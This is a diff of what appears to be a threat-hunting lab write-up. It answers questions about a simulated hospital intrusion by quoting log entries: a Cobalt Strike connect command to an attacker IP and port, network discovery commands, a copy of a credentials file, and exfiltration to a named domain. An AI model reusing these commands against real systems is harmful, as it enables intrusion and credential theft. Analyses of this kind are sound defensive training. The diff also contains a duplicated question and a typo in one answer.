@@ -795,7 +795,7 @@ PassiveDns
 
 <hr style="height: 2px; background-color: #333; border: none;">
 
-**What is the name of the docx file they are redirected to?**  
+#### **Q8: What is the name of the docx file they are redirected to?**  
 
 
 `Raisin_Kane_Promo_Offer.docx`  
@@ -804,7 +804,7 @@ PassiveDns
 
 <hr style="height: 2px; background-color: #333; border: none;">
 
-**What is the name of the pdf file they are redirected to?**  
+#### **Q9: What is the name of the pdf file they are redirected to?**  
 
 
 `Raisin_Kane_Free_Meal_Voucher.pdf`  
@@ -813,7 +813,14 @@ PassiveDns
 
 <hr style="height: 2px; background-color: #333; border: none;">
 
-**What is the hostname of the first person to download the suspicious docx file?**  
+#### **Q10: What is the hostname of the first person to download the suspicious docx file?**  
+
+
+&nbsp;
+
+<hr style="height: 2px; background-color: #333; border: none;">
+
+#### **Q10: What is the hostname of the first person to download the suspicious docx file?**  
 
 
 ```
@@ -830,8 +837,33 @@ FileCreationEvents
 
 <hr style="height: 2px; background-color: #333; border: none;">
 
-**What was the name of the malicious file dropped by the attackers?**  
+### **Questions 11-20**  
 
+#### **Q11: When did this download occur?**  
+
+`2024-05-01T09:56:50.000Z`
+
+&nbsp;
+
+<hr style="height: 2px; background-color: #333; border: none;">
+
+#### **Q12: What was the Sha256 hash of the file?**  
+
+`bd886046266b909a8ca5f19f16e5606baf73194a70632c81fdc44ef39ba29712`
+
+&nbsp;
+
+<hr style="height: 2px; background-color: #333; border: none;">
+
+#### **Q13: Which browser was used to download this file?**  
+
+`chrome.exe1`
+
+&nbsp;
+
+<hr style="height: 2px; background-color: #333; border: none;">
+
+#### **Q14: What was the name of the malicious file dropped by the attackers?**  
 
 ```
 FileCreationEvents
@@ -844,11 +876,13 @@ FileCreationEvents
 |---|---|---|---|---|---|---|
 |2024-05-01T09:57:17.000Z|RQJQ-MACHINE|evbrowne|0e7e0e888f22b5cc83ce5f2560f9f331d89b8e02875e98ace822e074f2ee486b|C:\ProgramData\cobaltstrike.exe|cobaltstrike.exe|explorer.exe|  
 
+`cobaltstrike.exe`
+
 &nbsp;
 
 <hr style="height: 2px; background-color: #333; border: none;">
 
-**Which command (`process_commandline`) shows the execution of the `Raisin_Kane_Promo_Offer.docx` file? (copy and paste the whole command)**  
+#### **Q15: Which command (`process_commandline`) shows the execution of the `Raisin_Kane_Promo_Offer.docx` file? (copy and paste the whole command)**  
 
 
 ```
@@ -867,7 +901,7 @@ ProcessEvents
 
 <hr style="height: 2px; background-color: #333; border: none;">
 
-**What IP address do the hackers connect to using cobalt strike?**  
+#### **Q16: What IP address do the hackers connect to using cobalt strike?**  
 
 
 ```
@@ -887,7 +921,7 @@ ProcessEvents
 
 <hr style="height: 2px; background-color: #333; border: none;">
 
-**Over what port do the hackers connect to that IP address?**  
+#### **Q17: Over what port do the hackers connect to that IP address?**  
 
 
 `50050`  
@@ -896,7 +930,7 @@ ProcessEvents
 
 <hr style="height: 2px; background-color: #333; border: none;">
 
-**What was the first discovery command issued by the hackers? (hint: it has to do with a system)**  
+#### **Q18: What was the first discovery command issued by the hackers? (hint: it has to do with a system)**  
 
 
 ```
@@ -915,7 +949,7 @@ ProcessEvents
 
 <hr style="height: 2px; background-color: #333; border: none;">
 
-**How many of these short discovery commands did the attackers run?**  
+#### **Q19: How many of these short discovery commands did the attackers run?**  
 
 
 |timestamp|parent_process_name|parent_process_hash|process_commandline|process_name|process_hash|hostname|username|
@@ -927,11 +961,13 @@ ProcessEvents
 |2024-05-03T10:05:50.000Z|cmd.exe|614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f|net localgroup administrators|cmd.exe|74a621fe8be438df479cbf0c93530d950dbdcd3b79f7020891676d38df342f94|RQJQ-MACHINE|evbrowne|
 |2024-05-03T10:30:50.000Z|cmd.exe|614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f|net view|cmd.exe|48445d2e91a38160507cdac26d3b6d10a8be43234df156365ce52cc444263180|RQJQ-MACHINE|evbrowne|  
 
+
+`6`
 &nbsp;
 
 <hr style="height: 2px; background-color: #333; border: none;">
 
-**What is Anthony Davis' hostname?**  
+#### **Q20: What is Anthony Davis' hostname?**  
 
 
 ```
@@ -947,7 +983,9 @@ Employees
 
 <hr style="height: 2px; background-color: #333; border: none;">
 
-**When did the attackers connect to their IP address using cobalt strike on Anthony Davis' machine?**  
+### **Questions 20-26**  
+
+#### **Q21: When did the attackers connect to their IP address using cobalt strike on Anthony Davis' machine?**  
 
 
 ```
@@ -961,14 +999,13 @@ ProcessEvents
 |---|---|---|---|---|---|---|---|
 |2024-05-14T12:24:45.000Z|cmd.exe|614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f|C:\ProgramData\cobaltstrike.exe --connect 93.238.22.123:50050|cmd.exe|c167a329392a515e1cd2eead7f1481e2acbb02645f7dd036254450e66681cb7f|AMFB-MACHINE|andavis|  
 
-
-"Once they got on Anthony Davis' machine, the hackers wanted to get a better understanding of the entire hospital network. So they downloaded an advanced scanning tool."  
-
 &nbsp;
 
 <hr style="height: 2px; background-color: #333; border: none;">
 
-**What was the name of this scanning tool?**  
+#### **Q22: What was the name of this scanning tool?**  
+
+Once they got on Anthony Davis' machine, the hackers wanted to get a better understanding of the entire hospital network. So they downloaded an advanced scanning tool.  
 
 
 ```
@@ -986,7 +1023,9 @@ ProcessEvents
 
 <hr style="height: 2px; background-color: #333; border: none;">
 
-**What was the name of the file the attackers exfiltrated to learn about the network? (hint: ___.pdf)**  
+#### **Q23: What was the name of the file the attackers exfiltrated to learn about the network? (hint: ___.pdf)**  
+
+To better understand the hospital's network, the attackers took files that showed the network layout. These files contained important diagrams.
 
 
 | process_commandline                                                                                              |
@@ -997,21 +1036,20 @@ ProcessEvents
 
 <hr style="height: 2px; background-color: #333; border: none;">
 
-**What was the name of the file the attackers took that would have contained usernames and passwords?**  
+#### **Q24: What was the name of the file the attackers took that would have contained usernames and passwords?**  
 
 
 | process_commandline                                                                                    |
 | ------------------------------------------------------------------------------------------------------ |
 | cmd.exe /c copy C:\Users\andavis\Documents\credentials.txt \\jojos-hospital.org\backup\credentials.txt |
 
-
-"Before stealing this file, the attackers first compressed them into a zip file. This allowed the files to be smaller so they would attract less attention."  
-
 &nbsp;
 
 <hr style="height: 2px; background-color: #333; border: none;">
 
-**What was the name of this zip file?**  
+#### **Q25: What was the name of this zip file?**   
+
+Before stealing this file, the attackers first compressed them into a zip file. This allowed the files to be smaller so they would attract less attention. 
 
 
 ```
@@ -1029,7 +1067,7 @@ ProcessEvents
 
 <hr style="height: 2px; background-color: #333; border: none;">
 
-**Which domain did the attackers send the zip to?**  
+#### **Q26: Which domain did the attackers send the zip to?**  
 
 
 `nothing-to-see-here.net`  
